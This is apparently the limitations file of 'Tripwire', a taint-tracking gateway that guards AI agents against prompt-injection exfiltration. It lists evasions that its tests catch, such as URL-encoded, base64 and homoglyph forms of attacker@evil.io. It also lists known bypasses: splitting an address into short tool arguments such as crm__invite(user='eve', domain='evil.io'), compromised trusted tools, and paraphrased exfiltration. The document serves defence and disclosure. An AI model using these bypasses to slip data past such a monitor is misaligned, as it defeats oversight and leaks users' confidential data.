# Limitations

What Tripwire cannot stop, stated plainly. Every item here is either covered by an `xfail` test (so CI notices if it changes) or is a design boundary. This file is extended in each phase. The design's definition of done ([design.md](design.md) section 10) requires the final version to cover paraphrased exfiltration, attacks within trusted tools, and model-level jailbreaks.

## Taint tracking (Phase 2)

### Covered evasions (for context)

From `gateway/tests/unit/test_taint_evasion.py`:

| Evasion | Caught by |
|---|---|
| Case changes (`ATTACKER@Evil.IO`) | value matching (entity, case-insensitive) |
| Homoglyph domain used verbatim | value matching (exact text) |
| URL-encoded address (`attacker%40evil.io`) | instruction origin (`untrusted_origin`) |
| Spelled out (`attacker at evil dot io`) | instruction origin |
| Base64-encoded address | instruction origin |
| Homoglyph domain invented by the model | instruction origin (Unicode-aware entity extraction) |
| Address split across args, one part 8+ characters | value matching (exact text) |

### Known bypasses

1. **Address split across arguments into short parts.** If an injection gets the agent to pass an address as several arguments that are each shorter than 8 characters and none is a full email, URL, path or 4+ digit number, no value matches and there is no entity for instruction origin. Example: `crm__invite(user="eve", domain="evil.io")`. Test: `test_split_address_with_short_parts_bypasses` (xfail, strict).
   *Mitigation:* describe such tools in the policy with `sink: true` and use `session_has`, `context_confidentiality_at_least`, or `require_approval` for high-risk sinks. Phase 3 detectors mark the page itself `suspicious` when it contains injection language.

2. **Decoded or rewritten values in a clean context.** Instruction origin only applies once untrusted content has entered the session. A rewritten value in a session that has seen no untrusted content gets no label. This is intended (no untrusted source exists), but a compromised *trusted* tool is not detected. See "Attacks within trusted tools" below.

3. **Instruction origin is coarse.** Any email, URL, path or long number that came from neither the user nor a tool result is labelled `untrusted_origin` once untrusted content is in context, including values the model legitimately produced (for example, an address it inferred correctly). Policies should pair `untrusted_origin` with `require_approval` rather than `block` where false positives are costly.

4. **Short values are not text-matched.** Residual text under 8 characters is ignored to avoid false links (for example "notes", "yes"). Short secrets or codes copied from untrusted content carry no label unless they are 4+ digit numbers.

5. **Homoglyphs are not folded.** `evіl.io` (Cyrillic) and `evil.io` (Latin) are different entities. A lookalike is caught as untrusted or untrusted_origin, but Tripwire does not warn that it imitates a real domain.

## Attacks within trusted tools

Data returned by a tool the policy marks `trust: trusted` is trusted. If that tool is compromised, or relays attacker content (for example a CRM that stores whatever a web form submitted), Tripwire treats its output as trusted. Mark such tools `untrusted`.

## Paraphrased exfiltration

If the agent summarizes confidential data in its own words and sends it out, value matching sees no shared text. Context taint still applies: `context_confidentiality_at_least` rules see that confidential data was read in the session, and they are the intended control.
